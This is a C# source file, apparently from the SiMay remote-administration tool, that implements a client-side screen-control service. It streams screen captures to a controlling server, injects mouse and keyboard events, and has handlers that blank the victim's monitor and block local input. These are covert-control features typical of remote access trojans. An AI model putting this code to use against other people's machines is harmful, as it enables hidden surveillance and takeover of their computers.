﻿using SiMay.Core;
using SiMay.Core.Enums;
using SiMay.Core.PacketModelBinder.Attributes;
using SiMay.Core.PacketModelBinding;
using SiMay.Core.Packets;
using SiMay.Core.ScreenSpy;
using SiMay.Core.ScreenSpy.Entitys;
using SiMay.RemoteService.NewCore.Attributes;
using SiMay.RemoteService.NewCore.Enums;
using SiMay.RemoteService.NewCore.Extensions;
using SiMay.RemoteService.NewCore.ServiceSource;
using SiMay.Serialize;
using SiMay.Sockets.Tcp;
using SiMay.Sockets.Tcp.Session;
using System;
using System.Drawing;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using static SiMay.RemoteService.NewCore.Win32Api;

namespace SiMay.RemoteService.NewCore.ControlService
{
    [ServiceKey("RemoteDesktopJob")]
    public class ScreenManager : ServiceManager, IServiceSource
    {

        private int _bscanmode = 1; //0逐行 1差异
        private ScreenSpy _spy;
        private PacketModelBinder<TcpSocketSaeaSession> _handlerBinder = new PacketModelBinder<TcpSocketSaeaSession>();
        public override void OnNotifyProc(TcpSocketCompletionNotify notify, TcpSocketSaeaSession session)
        {
            switch (notify)
            {
                case TcpSocketCompletionNotify.OnConnected:
                    break;
                case TcpSocketCompletionNotify.OnSend:
                    break;
                case TcpSocketCompletionNotify.OnDataReceiveing:
                    break;
                case TcpSocketCompletionNotify.OnDataReceived:
                    this._handlerBinder.InvokePacketHandler(session, session.CompletedBuffer.GetMessageHead(), this);
                    break;
                case TcpSocketCompletionNotify.OnClosed:
                    this._handlerBinder.Dispose();
                    break;
            }
        }

        [PacketHandler(MessageHead.S_GLOBAL_OK)]
        public void InitializeComplete(TcpSocketSaeaSession session)
        {
            _session.Socket.NoDelay = false;
            SendAsyncToServer(MessageHead.C_MAIN_OPEN_DLG,
                new OpenDialogPack()
                {
                    IdentifyId = AppConfiguartion.IdentifyId,
                    ServiceKey = this.GetType().GetServiceKey()
                });

            _spy = new ScreenSpy();
            _spy.OnDifferencesNotice += ScreenDifferences_OnDifferencesNotice;

            this.SendDesktopBitInfo();
        }

        private void SendDesktopBitInfo()
        {
            SendAsyncToServer(MessageHead.C_SCREEN_BITINFO,
               new ScreenBitInfoPack()
               {
                   Height = _spy.ScreenHeight,
                   Width = _spy.ScreenWidth
               });
        }

        private void ScreenDifferences_OnDifferencesNotice(Fragment[] fragments, DifferStatus nCode)
        {
            switch (nCode)
            {
                case DifferStatus.FULLDIFFERENCES:
                    SendAsyncToServer(MessageHead.C_SCREEN_DIFFBITMAP,
                        new ScreenFragmentPack()
                        {
                            Fragments = fragments
                        });
                    break;

                case DifferStatus.NEXTSCREEN:
                    SendAsyncToServer(MessageHead.C_SCREEN_BITMP,
                        new ScreenFragmentPack()
                        {
                            Fragments = fragments
                        });
                    break;

                case DifferStatus.COMPLETE:
                    SendAsyncToServer(MessageHead.C_SCREEN_SCANCOMPLETE);
                    break;
            }
        }
        [PacketHandler(MessageHead.S_SCREEN_NEXT_SCREENBITMP)]
        public void SendNextScreen(TcpSocketSaeaSession session)
        {
            var rect = session.CompletedBuffer.GetMessageEntity<ScreenHotRectanglePack>();
            //根据监控模式使用热区域扫描
            bool ishotRegtionScan = rect.CtrlMode == 1 ? true : false;

            if (_bscanmode == 0)
                _spy.FindDifferences(ishotRegtionScan, new Rectangle(rect.X, rect.Y, rect.Width, rect.Height));
            else if (_bscanmode == 1)
                _spy.FullFindDifferences(ishotRegtionScan, new Rectangle(rect.X, rect.Y, rect.Width, rect.Height));
        }

        [PacketHandler(MessageHead.S_SCREEN_CHANGESCANMODE)]
        public void ChangeSpyScanMode(TcpSocketSaeaSession session)
        {
            _bscanmode = session.CompletedBuffer.GetMessageBody()[0];
        }

        [PacketHandler(MessageHead.S_SCREEN_RESET)]
        public void SetSpyFormat(TcpSocketSaeaSession session)
        {
            _spy.SetFormat = session.CompletedBuffer.GetMessageBody()[0];
        }

        [PacketHandler(MessageHead.S_SCREEN_BLACKSCREEN)]
        public void SetScreenBlack(TcpSocketSaeaSession session)
        {
            SendMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, 2);
        }

        [PacketHandler(MessageHead.S_SCREEN_MOUSEBLOCK)]
        public void SetMouseBlock(TcpSocketSaeaSession session)
        {
            if (session.CompletedBuffer.GetMessageBody()[0] == 10)
                BlockInput(true);
            else
                BlockInput(false);
        }

        [PacketHandler(MessageHead.S_SCREEN_MOUSEKEYEVENT)]
        public void MouseKeyEvent(TcpSocketSaeaSession session)
        {
            var @event = session.CompletedBuffer.GetMessageEntity<ScreenMKeyPack>();
            int p1 = @event.Point1;
            int p2 = @event.Point2;
            switch (@event.Key)
            {
                case MOUSEKEY_ENUM.Move:
                    SetCursorPos(p1, p2);
                    break;

                case MOUSEKEY_ENUM.LeftDown:
                    SetCursorPos(p1, p2);
                    mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0);
                    break;

                case MOUSEKEY_ENUM.LeftUp:
                    SetCursorPos(p1, p2);
                    mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
                    break;

                case MOUSEKEY_ENUM.MiddleDown:
                    SetCursorPos(p1, p2);
                    mouse_event(MOUSEEVENTF_MIDDLEDOWN, 0, 0, 0, 0);
                    break;

                case MOUSEKEY_ENUM.MiddleUp:
                    SetCursorPos(p1, p2);
                    mouse_event(MOUSEEVENTF_MIDDLEUP, 0, 0, 0, 0);
                    break;

                case MOUSEKEY_ENUM.RightDown:
                    SetCursorPos(p1, p2);
                    mouse_event(MOUSEEVENTF_RIGHTDOWN, 0, 0, 0, 0);
                    break;

                case MOUSEKEY_ENUM.RightUp:
                    SetCursorPos(p1, p2);
                    mouse_event(MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0);
                    break;

                case MOUSEKEY_ENUM.Wheel:
                    mouse_event(MOUSEEVENTF_WHEEL, 0, 0, p1, 0);
                    break;

                case MOUSEKEY_ENUM.KeyDown:
                    keybd_event((byte)p1, 0, 0, 0);
                    break;

                case MOUSEKEY_ENUM.KeyUp:
                    keybd_event((byte)p1, 0, WM_KEYUP, 0);
                    break;
            }
        }
    }
}